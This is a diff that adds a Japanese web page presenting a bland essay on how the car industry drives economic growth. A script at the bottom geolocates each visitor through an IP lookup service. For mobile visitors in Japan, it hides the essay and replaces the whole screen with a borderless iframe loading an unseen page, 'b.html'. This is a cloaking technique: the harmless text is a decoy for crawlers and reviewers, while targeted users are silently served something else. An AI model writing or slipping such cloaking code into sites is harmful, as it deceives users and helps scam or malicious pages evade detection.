@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>自動車発展が経済発展に与える影響</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: sans-serif;
+            line-height: 1.8;
+            color: #333;
+            background: #ffffff;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 80px 0;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: clamp(28px, 4vw, 48px);
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .main {
+            padding: 60px 0;
+        }
+
+        .section {
+            margin-bottom: 60px;
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.1);
+            border: 1px solid #e9ecef;
+        }
+
+        .section h2 {
+            font-size: clamp(20px, 3vw, 28px);
+            color: #2c3e50;
+            margin-bottom: 25px;
+            font-weight: 600;
+            border-left: 4px solid #667eea;
+            padding-left: 20px;
+        }
+
+        .section p {
+            font-size: 16px;
+            line-height: 1.8;
+            color: #555;
+        }
+
+        .intro-section {
+            background: #f8f9fa;
+            border-left: 4px solid #28a745;
+        }
+
+        .conclusion-section {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+        }
+
+        .content {
+            display: block;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .section {
+                padding: 25px 20px;
+                margin-bottom: 30px;
+            }
+            
+            .main {
+                padding: 40px 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="content" class="content">
+        <header class="header">
+            <div class="container">
+                <h1>自動車発展が経済発展に与える影響</h1>
+            </div>
+        </header>
+
+        <main class="main">
+            <div class="container">
+                <section class="section intro-section">
+                    <h2>序論</h2>
+                    <p>自動車は現代交通の重要な手段として、人々の移動方法を変えただけでなく、経済発展のあらゆる側面に深い影響を与えています。</p>
+                </section>
+
+                <section class="section">
+                    <h2>産業のアップグレード促進</h2>
+                    <p>自動車産業の発展は、鉄鋼、電子、化学工業などの分野を含む関連産業の進歩を推進しています。このような業界横断的な協調効果は、技術革新と生産効率の向上を促進しています。</p>
+                </section>
+
+                <section class="section">
+                    <h2>雇用機会の増加</h2>
+                    <p>自動車の製造、販売、メンテナンスなどの各段階で大量の雇用機会が創出されています。産業チェーンの拡張に伴い、関連サービス業も発展し、経済成長の原動力となっています。</p>
+                </section>
+
+                <section class="section">
+                    <h2>消費の促進</h2>
+                    <p>自動車の普及により消費者の移動の利便性が向上し、消費需要が刺激されています。人々の自動車購入、保険、メンテナンスなどの支出は、経済成長をさらに推進しています。</p>
+                </section>
+
+                <section class="section">
+                    <h2>インフラの改善</h2>
+                    <p>自動車の発展により、各国は交通インフラへの投資を拡大し、道路、橋梁、駐車場などの施設建設が向上しています。これは交通状況の改善だけでなく、地域経済の発展も促進しています。</p>
+                </section>
+
+                <section class="section conclusion-section">
+                    <h2>結論</h2>
+                    <p>自動車の発展は技術進歩の体現であるだけでなく、経済成長を推進する重要な力でもあります。産業のアップグレード促進、雇用の増加、消費の向上を通じて、自動車は経済の持続可能な発展のための強固な基盤を築いています。</p>
+                </section>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => { 
+                if (data.country === 'JP' && isMobileDevice()) {
+                    document.getElementById('content').classList.add('hidden');
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'b.html';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                    return;
+                }
+            })
+            .catch(error => {
+                console.error('Error fetching IP data:', error);
+            });
+    </script>
+</body>
+</html>
